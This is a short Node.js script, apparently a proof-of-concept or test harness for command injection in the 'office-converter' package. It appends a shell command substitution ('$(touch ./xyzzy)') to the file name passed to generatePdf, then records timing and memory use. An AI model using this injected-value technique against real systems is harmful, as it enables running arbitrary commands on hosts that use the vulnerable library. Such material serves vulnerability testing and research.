const {performance} = require('perf_hooks');
let t0 = performance.now();

done = function done(){
    console.log("Done!");
};


var DUMMY_FILE = './xyzzy';

var command = "$(touch " + DUMMY_FILE + ")";

function dummySource(val){
    command += val;
}

dummySource(' ');

var converter = require('office-converter')();
console.log("*** before calling generatePdf");

 function fun(err, result) {
    if (!err && result.status === 0) {
        console.log('Output File located at ' + result.outputFile);
    }
}

converter.generatePdf('./test.xls' + command, fun);
console.log("*** after calling generatePdf");

done();

let t1 = performance.now();
let mem = process.memoryUsage().heapUsed / 1024 / 1024;
console.log((t1 - t0)/1000);
console.log(Math.round(mem * 100) / 100);

